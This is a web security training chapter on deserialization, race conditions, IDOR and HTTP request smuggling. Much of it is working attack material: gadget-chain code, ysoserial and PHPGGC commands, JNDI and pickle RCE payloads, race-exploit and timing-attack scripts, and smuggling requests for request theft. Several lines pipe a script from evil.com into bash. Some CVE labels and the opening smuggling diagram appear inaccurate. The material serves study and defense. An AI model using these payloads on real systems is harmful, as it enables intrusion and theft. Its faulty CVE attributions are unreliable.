# Deserialization, Race Conditions, and HTTP Request Smuggling

## 1. Insecure Deserialization

### 1.1 Java Deserialization

Java deserialization vulnerabilities arise when `ObjectInputStream.readObject()` processes untrusted data. The attack chains exploit "gadget" classes in the classpath that perform dangerous operations during deserialization:

```java
// The core vulnerability: deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject();  // Executes gadget chain

// Common vulnerable endpoints:
// 1. RMI (Remote Method Invocation) - default port 1099
// 2. JMX (Java Management Extensions) - default port 9010
// 3. Spring HTTP invoker
// 4. Custom protocol buffers with Java serialization
// 5. Session storage (Tomcat, WebLogic sessions stored as serialized objects)
// 6. JMS (Java Message Service) message bodies
```

**Apache Commons Collections (ysoserial)**:

The most widely exploited Java deserialization chain uses `org.apache.commons.collections`:

```java
// ysoserial CommonsCollections5 chain (Transformer chain)
// Chain: AnnotationInvocationHandler.readObject() →
//        Map(Proxy).entrySet() →
//        AnnotationInvocationHandler.invoke() →
//        LazyMap.get() →
//        ChainedTransformer.transform() →
//        Runtime.exec()

// Manual chain construction:
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.DefaultedMap;

Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"touch /tmp/pwned"})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
Map expMap = new HashMap();
expMap.put(entry, "value");
```

```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64

# Generate for specific targets:
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections7 'curl https://evil.com/shell.sh | bash' > payload.bin
java -jar ysoserial.jar Spring1 'touch /tmp/pwned' > payload.bin
java -jar ysoserial.jar Groovy1 'calc.exe' > payload.bin
java -jar ysoserial.jar JBossInterceptors1 'id' > payload.bin
java -jar ysoserial.jar URLDNS 'http://dnslog.attacker.com' > payload.bin  # DNS callback for detection

# JRMP (Java Remote Method Protocol) exploitation:
java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin
# On attacker machine:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

**Spring Framework Deserialization**:

```java
// Spring4Shell (CVE-2022-22965) - Class loader manipulation via data binding
// Attack: Modify Tomcat's AccessLogValve through Spring's data binding
// POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di
//      &class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
//      &class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
//      &class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
//      &class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
// HTTP/1.1 200

// Then trigger log write:
// GET /anything?<c2>=<webshell_content> HTTP/1.1
// This writes a JSP webshell to webapps/ROOT/tomcatwar.jsp

// Spring Cloud Function SpEL injection (CVE-2022-22963)
// POST /functionRouter HTTP/1.1
// spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')
// Content-Type: application/json
//
// {"input": "test"}
```

**fastjson Deserialization** (Java):

```java
// fastjson autoType deserialization (CVE-2017-18349, CVE-2020-8899, etc.)
// Vulnerable: JSON.parseObject(input, Feature.SupportAutoType)
// Attack payloads:
{"@type":"java.net.Inet4Address","val":"dnslog.attacker.com"}  // DNS callback
{"@type":"java.net.Inet6Address","val":"dnslog.attacker.com"}  // DNS callback

// RCE via JNDI (CVE-2017-18349):
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com:1099/Exploit","autoCommit":true}

// RCE via JNDI (LDAP variant):
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// fastjson 1.2.68 bypass (CVE-2020-8899):
{"@type":"java.lang.AutoCloseable" 
  // Uses a secondary @type for the actual gadget
}
```

### 1.2 PHP Object Injection

PHP deserialization occurs when `unserialize()` processes user-controlled data:

```php
// Vulnerable code:
$data = unserialize($_GET['data']);

// Simple PHP Object Injection:
class User {
    public $username = 'guest';
    public $role = 'user';
    
    function __wakeup() {
        // Called during unserialize
        if ($this->role === 'admin') {
            $this->loginAsAdmin();
        }
    }
}

// Attack payload:
$payload = 'O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}';
// O:4:"User"     → Object of class "User" (4 chars)
// 2:             → 2 properties
// s:8:"username" → String property "username" (8 chars)
// s:5:"admin"   → String value "admin" (5 chars)
// s:4:"role"     → String property "role" (4 chars)
// s:5:"admin"    → String value "admin" (5 chars)

// Crafting payloads:
$username = 'admin';
$role = 'admin';
$payload = serialize(new User($username, $role));
// Result: O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
```

**PHP gadget chains** — Laravel, WordPress, Composer:

```php
// Laravel POP chain (CVE-2019-9081)
// Chain: Illuminate\Broadcasting\PendingBroadcast → Illuminate\Events\Dispatcher → 
//        Illuminate\Validation\Validator → call_user_func_array()

// Manual chain construction:
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $view = 'phpinfo';
        public function __construct($events, $view) {
            $this->events = $events;
            $this->view = $view;
        }
    }
}

namespace Illuminate\Events {
    class Dispatcher {
        protected $listeners = [];
        public function __construct() {
            $this->listeners = [
                'phpinfo' => [['system', 'id']]
            ];
        }
    }
}

// PHPGGC (PHP Generic Gadget Chains) tool:
// phpggc Laravel/RCE1 'id'
// phpggc Laravel/RCE2 'curl http://evil.com/shell.sh | bash'
// phpggc Symfony/RCE1 'id'
// phpggc WordPress/PDO     (WordPress POP chain)
// phpggc Yii2/RCE1 'id'
```

**PHP deserialization via phar:// wrapper**:

```php
// Phar metadata deserialization (PHP < 8.0, still works in many configurations)
// Any file operation that accepts a URL-like path can trigger deserialization:
file_exists('phar://malicious.tar');
is_file('phar://malicious.tar');
file_get_contents('phar://malicious.tar');
include('phar://malicious.tar');  // Also triggers file inclusion

// Creating a malicious phar:
$phar = new Phar('malicious.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($malicious_object);  // Serialized object injected here
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

// Attack vector: upload malicious image/file, then trigger deserialization via phar://
// Many applications allow image uploads and later check file_exists() on user-controlled paths
// file_exists($_GET['path']) → phar://uploaded_file triggers deserialization
```

### 1.3 Python Deserialization

```python
# Pickle deserialization (most dangerous Python deserialization vector)
import pickle
import os

# Safe: pickle with restricted class allowance
# Unsafe: pickle.loads(untrusted_data)

# Constructing a malicious pickle payload:
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

malicious_data = pickle.dumps(Exploit())
# If server calls pickle.loads(malicious_data), os.system('id') executes

# More complex RCE payload:
import pickle
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl https://evil.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
# Send as: ?data=gASVLgAAAAAAAACMBXBvc2l4...

# Pickle opcodes for manual payload construction (avoids class imports):
# Pickle is a stack-based VM; opcodes can be crafted manually:
import pickletools
# pickletools.dis(payload) shows the opcodes

# Python YAML deserialization (PyYAML)
import yaml

# Vulnerable: yaml.load() with default Loader
data = yaml.load(user_input)  # VULNERABLE: yaml.FullLoader or yaml.SafeLoader needed

# RCE via YAML:
yaml.load('!!python/object/apply:os.system ["id"]')  # RCE
yaml.load('!!python/object/new:subprocess.check_output [["id"]]')  # RCE
yaml.load('!!python/object/apply:subprocess.check_output [["curl","https://evil.com/shell.sh","|","bash"]]')  # RCE

# Safe alternative:
yaml.safe_load(user_input)  # Only allows basic Python types

# Python eval/exec injection (not deserialization, but similar impact)
eval(user_input)             # RCE: __import__('os').system('id')
exec(user_input)             # RCE: import os; os.system('id')
```

### 1.4 .NET Deserialization

```csharp
// ViewState deserialization (ASP.NET)
// If machineKey is known or predictable, ViewState can be forged
// ViewState is a serialized object embedded in ASP.NET pages:
// <input type="hidden" name="__VIEWSTATE" value="/wEPDwULLTE..." />

// Attack: Decrypt ViewState, modify, re-encrypt with known machineKey
// If validation is disabled or MAC validation key is known:
//ViewState: encrypted ASP.NET serialized object

// ysoserial.net for .NET deserialization:
// ysoserial.net -f LosFormatter -o base64 -c "id" -g TypeConfuseDelegate
// ysoserial.net -f LosFormatter -o base64 -c "id" -g ObjectStateFormatter
// ysoserial.net -f LosFormatter -o base64 -c "id" -g TextFormattingRunProperties

// BinaryFormatter deserialization (most dangerous .NET deserializer):
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(untrustedStream);  // RCE

// ViewState MAC bypass (CVE-2020-0688):
// Exchange Server uses a static machineKey:
// <machineKey validationKey="3B1D48...830EC2" decryptionKey="C4B97...63A9B" />
// With known keys, forge ViewState with embedded deserialization payload
```

### 1.5 Node.js Deserialization (Prototype Pollution Chains)

```javascript
// Node-serialize deserialization (CVE-2017-5941)
// Vulnerable: node-serialize module's unserialize() function
var serialize = require('node-serialize');

// Payload with IIFE (Immediately Invoked Function Expression):
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(e,s){console.log(s)})}()"}';
serialize.unserialize(payload);
// The _$$ND_FUNC$$_ marker tells node-serialize to eval the function
// The () at the end makes it an IIFE — executes immediately on deserialization

// Prototype pollution chains in Node.js:
// Many Node.js deserialization vectors lead to prototype pollution rather than direct RCE
// Common vulnerable merge functions in lodash, hoek, merge-deep, etc.

// lodash.merge prototype pollution (CVE-2020-8203):
const lodash = require('lodash');
lodash.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// Object.prototype.isAdmin === true

// Polluting prototype to achieve RCE:
// Gadget: express + ejs template engine
// Pollution: Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').exec('id');//"
// When EJS renders a template, it compiles using the polluted outputFunctionName
// Result: arbitrary command execution

// Gadget: express + handlebars
// Pollution: Object.prototype.preventIndent = true
// Changes Handlebars compilation behavior, potentially enabling template injection
```

---

## 2. Race Conditions

### 2.1 TOCTOU (Time of Check to Time of Use)

Race conditions occur when an application's behavior depends on the timing of interleaved operations:

```python
# Classic TOCTOU: Bank transfer race condition
@app.route('/api/transfer', methods=['POST'])
@login_required
def transfer():
    amount = request.json['amount']
    to_account = request.json['to_account']
    
    # CHECK: Verify sufficient balance
    balance = db.get_balance(current_user.account_id)
    if balance < amount:
        return jsonify({"error": "Insufficient funds"}), 400
    
    # TIME GAP: Between check and use, another request can change state
    
    # USE: Deduct amount and credit recipient
    db.deduct_balance(current_user.account_id, amount)
    db.credit_balance(to_account, amount)
    
    return jsonify({"success": True, "new_balance": db.get_balance(current_user.account_id)})

# Race condition attack: Two concurrent transfer requests
# Request 1: Transfer $100 (balance = $100)
# Request 2: Transfer $100 (balance = $100)
# If both requests pass the balance check before either deducts:
# Request 1 check: balance=100 >= 100 ✓
# Request 2 check: balance=100 >= 100 ✓
# Request 1 deduct: balance=0
# Request 2 deduct: balance=-100 (overdraft!)
# Result: Two transfers of $100 from an account with only $100

# Exploitation with concurrent requests:
import threading
import requests

def race_transfer(session, amount, to_account):
    resp = session.post('https://bank.target.com/api/transfer',
                       json={'amount': amount, 'to_account': to_account})
    return resp.json()

# Send multiple concurrent requests
threads = []
for i in range(10):
    t = threading.Thread(target=race_transfer, args=(session, 100, 'attacker_account'))
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()
```

### 2.2 Limit Bypass via Race Condition

```python
# Rate limit bypass via race condition
@app.route('/api/apply-promo', methods=['POST'])
@login_required
def apply_promo():
    promo_code = request.json['promo_code']
    
    # CHECK: Verify promo code hasn't been used
    if db.promo_already_used(current_user.id, promo_code):
        return jsonify({"error": "Promo code already used"}), 400
    
    # USE: Apply promotional discount
    db.apply_promo(current_user.id, promo_code)
    return jsonify({"success": True, "discount_applied": True})

# Attack: Send 10 concurrent requests to apply the same promo code 10 times
# If all 10 requests check before any mark the code as used, all succeed

# Similar patterns:
# - Applying a coupon code multiple times
# - Withdrawing money beyond account balance
# - Voting/rating multiple times
# - Claiming a one-time reward multiple times
# - Purchasing a limited-quantity item multiple times
```

### 2.3 Double-Submit / Double-Spend

```python
# Double-submit race condition in payment processing
@app.route('/api/process-payment', methods=['POST'])
@login_required
def process_payment():
    payment_id = str(uuid.uuid4())
    amount = request.json['amount']
    
    # Vulnerable: No idempotency check
    charge = stripe.Charge.create(
        amount=amount,
        currency='usd',
        source=request.json['token'],
        metadata={'payment_id': payment_id}
    )
    
    db.record_payment(current_user.id, payment_id, amount)
    return jsonify({"payment_id": payment_id, "status": "success"})

# Attack: Submit the same payment twice before the first is recorded
# Two concurrent requests with identical data → two charges for one intended payment

# Defense: Idempotency key
@app.route('/api/process-payment', methods=['POST'])
@login_required
def process_payment():
    idempotency_key = request.json['idempotency_key']  # Client-generated UUID
    
    # Check if this idempotency key was already processed
    existing = db.get_payment_by_idempotency_key(idempotency_key)
    if existing:
        return jsonify(existing)  # Return same result without re-processing
    
    # Process payment only if idempotency key is new
    payment_id = str(uuid.uuid4())
    charge = stripe.Charge.create(
        amount=request.json['amount'],
        currency='usd',
        source=request.json['token'],
        idempotency_key=idempotency_key  # Stripe supports idempotency keys
    )
    
    db.record_payment(current_user.id, payment_id, charge.amount, idempotency_key)
    return jsonify({"payment_id": payment_id, "status": "success"})
```

### 2.4 Timing Attacks

```python
# Timing attack on authentication comparison
# Vulnerable: String comparison that short-circuits on first mismatch
@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    provided_token = request.json['token']
    expected_token = app.config['API_TOKEN']
    
    # VULNERABLE: Leaks information via timing
    if provided_token == expected_token:
        return jsonify({"valid": True})
    else:
        return jsonify({"valid": False})

# Attack: Character-by-character timing comparison
import time
import string

def timing_attack(base_url, known_prefix, charset=string.ascii_letters + string.digits):
    """Extract a secret token character by character via timing."""
    result = known_prefix
    while True:
        best_char = None
        best_time = 0
        for char in charset:
            test_token = result + char + '0' * (32 - len(result) - 1)
            start = time.time()
            requests.post(f"{base_url}/api/verify-token", json={"token": test_token})
            elapsed = time.time() - start
            
            if elapsed > best_time:
                best_time = elapsed
                best_char = char
        
        if best_char:
            result += best_char
            print(f"[+] Position {len(result)}: {best_char} (time: {best_time:.4f}s)")
        else:
            break
    
    return result

# Defense: Constant-time comparison
import hmac

@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    provided_token = request.json['token']
    expected_token = app.config['API_TOKEN']
    
    # SECURE: Constant-time comparison (hmac.compare_digest)
    if hmac.compare_digest(provided_token.encode(), expected_token.encode()):
        return jsonify({"valid": True})
    else:
        return jsonify({"valid": False})
```

---

## 3. IDOR Patterns

### 3.1 IDOR Taxonomy

Insecure Direct Object Reference (IDOR) encompasses access control failures where an object identifier is used without authorization verification:

```http
# Sequential ID IDOR
GET /api/v1/users/42/profile HTTP/1.1
Authorization: Bearer user_19_token
→ 200 OK (accessing user 42's data with user 19's credentials)

# UUID-based IDOR (harder but not impossible)
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440000/profile HTTP/1.1
→ UUIDs can be leaked through listing endpoints, Referer headers, or logs

# File path IDOR
GET /api/v1/documents/../../etc/passwd HTTP/1.1
→ Path traversal to access files outside intended directory

# Encrypted ID IDOR
GET /api/v1/users/eyJpZCI6MX0=/profile HTTP/1.1
→ Base64 of {"id":1} — not encryption, just encoding

# Hash ID IDOR
GET /api/v1/users/a1b2c3d4e5f6/profile HTTP/1.1
→ If hash is derived from predictable input (e.g., MD5 of user ID)
```

### 3.2 IDOR Exploitation Patterns

```python
# Pattern 1: Parameter tampering
# Change user ID in request parameters
/api/users/42/profile   →   /api/users/1/profile    (access admin profile)
/api/orders/12345       →   /api/orders/12346       (access other orders)
/api/invoices/INV-001   →   /api/invoices/INV-002  (access other invoices)

# Pattern 2: HTTP method tampering
GET /api/users/42       → 403 Forbidden (user 42 can't view user 19)
PUT /api/users/42       → 200 OK (but can modify user 42's data)
DELETE /api/users/42    → 200 OK (can delete other users)

# Pattern 3: Body parameter manipulation
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer user_19_token

{
  "name": "John Doe",
  "email": "john@example.com",
  "user_id": 42          ← Changing user_id modifies different user
}

# Pattern 4: TypeScript/Java convention changes
# Java: userId, userName → Python: user_id, user_name
# If API uses one convention but backend uses another, authorization may check wrong field

# Pattern 5: Wildcard/parameter pollution
GET /api/v1/users/*/profile HTTP/1.1    → All profiles
GET /api/v1/users/all HTTP/1.1          → All users
GET /api/v1/users/.json HTTP/1.1         → Multiple formats may bypass auth
```

---

## 4. HTTP Request Smuggling

### 4.1 HTTP Request Smuggling Fundamentals

HTTP request smuggling exploits discrepancies in how front-end (proxy/load balancer) and back-end servers parse HTTP requests. When two servers disagree about where one request ends and the next begins, an attacker can "smuggle" a second request into the back-end server:

```
Client sends:                    Front-end parses:           Back-end parses:
POST / HTTP/1.1                  One request:                 Two requests:
Content-Length: 13                Content-Length: 13           Request 1: CL=13
Transfer-Encoding: chunked       Body: "HELLO\r\n\r\n"       Body: "HELLO"
                                                              
0\r\n                            TE header overrides           Request 2: starts at
\r\n                             CL in front-end               "SMUGGLED\r\n..."
SMUGGLED\r\n                    (TE_CL: TE wins)              (CL=13, body is 13 bytes
\r\n                                                            including "SMUGGLED\r\n")
```

### 4.2 CL.TE Smuggling

The front-end uses Content-Length, the back-end uses Transfer-Encoding:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Front-end interpretation** (Content-Length):
- Total body length: 13 bytes
- Body: `0\r\n\r\nSMUGGLED`
- One complete request

**Back-end interpretation** (Transfer-Encoding: chunked):
- Chunk of length 0 (end of body)
- `SMUGGLED` becomes the start of a new request

```python
# CL.TE smuggling exploit
import socket

def cl_te_smuggle(host, port, smuggled_request):
    """Send a CL.TE smuggled request."""
    body = f"0\r\n\r\n{smuggled_request}"
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(request.encode())
    response = sock.recv(4096)
    sock.close()
    return response
```

### 4.3 TE.CL Smuggling

The front-end uses Transfer-Encoding, the back-end uses Content-Length:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**Front-end interpretation** (Transfer-Encoding: chunked):
- Chunk of length 8 (hex) = 8 bytes: `SMUGGLED`
- Chunk of length 0: end of message
- One complete request with body `SMUGGLED`

**Back-end interpretation** (Content-Length):
- Body length: 3 bytes
- Body: `8\r\n` (first 3 bytes)
- `SMUGGLED\r\n0\r\n\r\n` becomes a new request

```http
# TE.CL smuggling with smuggled request for victim
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Front-end** (TE: chunked): Processes chunk of 92 bytes (`5c` hex = 92), then chunk of 0 (end).

**Back-end** (CL: 4): Reads 4 bytes (`5c\r\n`), the rest is treated as a new request starting with `GPOST`.

### 4.4 TE.TE Smuggling

Both servers claim to support Transfer-Encoding, but one processes a malformed variant:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

0

SMUGGLED
```

**Front-end** (processes first TE header): Uses chunked encoding, sees `0\r\n\r\n` as end of chunked body. `SMUGGLED` starts a new request.

**Back-end** (processes second TE header): Doesn't recognize `Transfer-encoding: cow`, falls back to Content-Length of 4. Body is `0\r\n` (4 bytes), then processes `SMUGGLED` as a new request.

TE obfuscation variants:
```
Transfer-Encoding: chunked          (standard)
Transfer_Encoding: chunked          (underscore variant)
Transfer-Encoding: chunked\r\t      (tab in header value)
X: \nTransfer-Encoding: chunked     (header continuation)
Transfer-Encoding: chunked, cow      (multiple encodings)
Transfer-Encoding:chunked            (no space after colon)
Transfer-Encoding:  chunked          (extra space)
```

### 4.5 HTTP/2 Request Smuggling (H2.TE, H2.CL)

HTTP/2 uses binary framing, but many front-end servers downgrade HTTP/2 to HTTP/1.1 for the back-end, creating smuggling opportunities:

```http
# HTTP/2 → HTTP/1.1 downgrade smuggling
# Client sends HTTP/2 request with:
# :method: POST
# :path: /
# content-length: 0
# transfer-encoding: chunked   (invalid in HTTP/2, but front-end may pass it through)
#
# Front-end (HTTP/2): Sees content-length: 0, treats request as having empty body
# Back-end (HTTP/1.1): Sees transfer-encoding: chunked, treats request differently

# HTTP/2 CRLF injection via pseudo-headers
# If front-end converts :path to HTTP/1.1 request line:
# :path: /index.html HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin HTTP/1.1
# Resulting HTTP/1.1 request may contain a smuggled request

# HTTP/2 downgrade with content-length mismatch
# Client sends HTTP/2 request with:
# :method: POST
# :path: /api/data
# content-length: 100
# [100 bytes of body data]
# [smuggled request data]
#
# Front-end sees content-length: 100, reads 100 bytes
# Back-end sees the same content-length but the connection persists
# Smuggled data may be processed as a new request
```

### 4.6 Request Smuggling Detection and Exploitation

```python
# Detection: Timing-based detection
import time
import requests

def detect_smuggling(host, path="/"):
    """Detect HTTP request smuggling via timing differences."""
    
    # Normal request (should return quickly)
    normal_start = time.time()
    requests.post(f"https://{host}{path}", 
                  data="test=test", 
                  headers={"Content-Length": "9"},
                  timeout=5)
    normal_time = time.time() - normal_start
    
    # CL.TE probe: mismatched CL and TE
    cl_te_start = time.time()
    try:
        requests.post(f"https://{host}{path}",
                     data="0\r\n\r\nSMUGGLED",
                     headers={
                         "Content-Length": "13",
                         "Transfer-Encoding": "chunked"
                     },
                     timeout=5)
    except requests.Timeout:
        pass  # Timeout indicates possible smuggling
    cl_te_time = time.time() - cl_te_start
    
    # TE.CL probe
    te_cl_start = time.time()
    try:
        requests.post(f"https://{host}{path}",
                     data="5c\r\nGPOST / HTTP/1.1\r\nHost: target\r\n\r\n0\r\n\r\n",
                     headers={
                         "Content-Length": "4",
                         "Transfer-Encoding": "chunked"
                     },
                     timeout=5)
    except requests.Timeout:
        pass
    te_cl_time = time.time() - te_cl_start
    
    print(f"Normal: {normal_time:.2f}s, CL.TE: {cl_te_time:.2f}s, TE.CL: {te_cl_time:.2f}s")
    
    if cl_te_time > normal_time + 3:
        print("[!] Possible CL.TE smuggling detected")
    if te_cl_time > normal_time + 3:
        print("[!] Possible TE.CL smuggling detected")
```

**Request smuggling exploitation scenarios**:

```http
# Exploitation 1: Bypass front-end security controls
# Front-end blocks /admin paths, but back-end doesn't
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cookie: session=victim_session

# Exploitation 2: Poison web cache
# Front-end caches responses for URL paths
# Smuggle a request that returns a malicious response for a legitimate URL

POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /static/javascript.js HTTP/1.1
Host: target.com

# The smuggled request "GET /static/javascript.js" is paired with
# the NEXT legitimate request's response, which gets cached under /static/javascript.js

# Exploitation 3: Steal other users' requests
# Smuggle a request that captures the next user's request as data

POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

# The next legitimate user's request (including session cookie)
# becomes the body of the smuggled POST /capture request
# If /capture logs request bodies, the attacker can read the logs
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| Java deserialization chains | This chapter (Section 1.1) |
| PHP Object Injection | This chapter (Section 1.2) |
| Python deserialization | This chapter (Section 1.3) |
| .NET deserialization | This chapter (Section 1.4) |
| Node.js prototype pollution | This chapter (Section 1.5) |
| Race conditions and TOCTOU | This chapter (Section 2) |
| HTTP Request Smuggling | This chapter (Section 4) |
| IDOR patterns | This chapter (Section 3) |
| OWASP A08 | `01b_owasp_top10_deep_dive.md` |
| WAF bypass for smuggling | `05b_waf_bypass_techniques.md` |
| SSTI injection | `02a_injection_attacks.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening techniques | `06b_web_hardening_defense.md` |

---

*Deserialization, race conditions, and HTTP request smuggling represent the most subtle and devastating vulnerability classes. They exploit the gap between what developers believe their code does and what actually happens at the network and language level. Defending against these requires deep understanding of serialization internals, concurrent state management, and HTTP protocol parsing ambiguities.*

---

## References

1. OWASP Foundation. "Deserialization Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
2. Frohoff, C. "ysoserial: A Proof-of-Concept Tool for Generating Payloads." https://github.com/frohoff/ysoserial
3. Kettle, J. "HTTP Desync Attacks: Request Smuggling Reborn." PortSwigger Research, 2019. https://portswigger.net/research/http-desync-attacks
4. Kettle, J. "HTTP/2 Desync Attacks." PortSwigger Research, 2023. https://portswigger.net/research/http2
5. Munoz, R. "PHP Object Injection." https://www.owasp.org/index.php/PHP_Object_Injection
6. ysoserial.net. ".NET Deserialization Payload Generator." https://github.com/pwntester/ysoserial.net
7. Pickel, B. "Java Deserialization Attacks." AppSec USA, 2016.
8. PortSwigger Ltd. "HTTP Request Smuggling." https://portswigger.net/web-security/request-smuggling
9. OWASP Foundation. "Insecure Deserialization." https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization
10. CVE-2015-4852. "Oracle WebLogic Deserialization RCE." NVD. https://nvd.nist.gov/vuln/detail/CVE-2015-4852
11. CVE-2021-44228. "Log4Shell: Apache Log4j RCE." NVD. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
12. CWE-362. "Concurrent Execution Using Shared Resource (Race Condition)." MITRE. https://cwe.mitre.org/data/definitions/362.html